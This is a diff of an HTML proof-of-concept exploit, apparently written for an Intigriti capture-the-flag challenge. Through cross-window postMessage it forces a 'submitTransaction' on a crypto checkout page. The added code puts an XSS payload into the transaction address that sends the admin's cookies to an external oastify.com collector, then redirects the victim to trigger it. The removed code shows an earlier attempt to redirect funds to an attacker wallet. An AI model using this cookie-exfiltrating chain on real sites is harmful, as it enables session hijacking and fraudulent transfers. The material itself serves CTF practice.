@@ -1,38 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>PostMessage Exploit PoC</title>
+    <title>Crypto Heist PoC</title>
 </head>
 <body>
-    <h1>"Following the trail of coins..."</h1>
-    <p>Target loaded in iframe. Sending payloads...</p>
-    
-    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1" width="500" height="500"></iframe>
+    <h1>Executing MarketWatch XSS Chain...</h1>
+    <p>Do not close this tab.</p>
 
     <script>
-        window.onload = function() {
-            var targetFrame = document.getElementById('target').contentWindow;
-
-            var maliciousPayload = {
+        // Step 1: Open the checkout page to prepare the CSRF
+        const victimWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
+        
+        // This payload breaks out of the title="" attribute in marketwatch.html
+        // and sends the Admin's cookies directly to your Burp Collaborator.
+        const XSS_PAYLOAD = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?flag=\'+document.cookie)">';
+        
+        // Step 2: Wait 4 seconds for the Admin wallet to load, then send the malicious transaction
+        setTimeout(() => {
+            victimWindow.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    currency: 'BTC',
-                    amount: 1337,
-                    toAddress: '11854a13cc79b72d8e6485a8f0801e607d' // Your BTC wallet
+                    currency: '1337COIN',
+                    amount: 1, 
+                    toAddress: XSS_PAYLOAD // The XSS goes here!
                 }
-            };
+            }, '*');
+            
+            console.log("Transaction sent. Waiting for API to process...");
 
-            // Step 2: Spam the message every 500ms for 10 seconds.
-            // This guarantees we hit the listener exactly when the wallets are loaded.
-            var count = 0;
-            var interval = setInterval(() => {
-                targetFrame.postMessage(maliciousPayload, '*');
-                console.log("Payload sent! Attempt: " + (count + 1));
-                
-                count++;
-                if(count >= 20) clearInterval(interval); // Stop after 10 seconds
-            }, 500); 
-        };
+            // Step 3: Wait 2 seconds for the transaction to save, then redirect the Admin to MarketWatch to trigger the XSS
+            setTimeout(() => {
+                victimWindow.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
+            }, 2000);
+
+        }, 4000); 
     </script>
 </body>
 </html>
